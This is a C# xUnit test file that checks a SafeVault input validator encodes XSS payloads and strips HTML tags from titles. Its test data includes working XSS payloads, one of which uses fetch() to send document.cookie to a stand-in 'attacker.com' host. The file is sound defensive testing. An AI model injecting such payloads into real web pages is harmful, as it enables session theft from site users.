using SafeVault.Core.Security;
using Xunit;

namespace SafeVault.Tests;

/// <summary>
/// Security Verification Tests for Cross-Site Scripting (XSS) Prevention.
/// Tests input sanitization and defensive output encoding.
/// </summary>
public class XssProtectionSecurityTests
{
    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert(document.cookie)>")]
    [InlineData("<svg/onload=fetch('http://attacker.com/steal?data='+document.cookie)>")]
    [InlineData("javascript:alert(1)")]
    [InlineData("<iframe src=\"javascript:alert(1)\"></iframe>")]
    public void SanitizeForHtml_MaliciousPayloads_AreProperlyEncoded(string maliciousPayload)
    {
        // Act
        string encoded = InputValidator.SanitizeForHtml(maliciousPayload);

        // Assert: Raw HTML brackets must be replaced with entities
        Assert.DoesNotContain("<script>", encoded, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", encoded, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<iframe", encoded, StringComparison.OrdinalIgnoreCase);
        Assert.True(encoded.Contains("&lt;") || !encoded.Contains("<"), "Payload was not safely escaped.");
    }

    [Theory]
    [InlineData("<b>Important Note</b>", "Important Note")]
    [InlineData("<script>bad()</script>Clean Title", "Clean Title")]
    [InlineData("Project Plan 2026", "Project Plan 2026")]
    public void StripHtmlTags_RemovesAllHtmlMarkupFromTitles(string input, string expectedClean)
    {
        // Act
        string stripped = InputValidator.StripHtmlTags(input);

        // Assert
        Assert.Equal(expectedClean, stripped);
        Assert.DoesNotContain("<", stripped);
        Assert.DoesNotContain(">", stripped);
    }
}
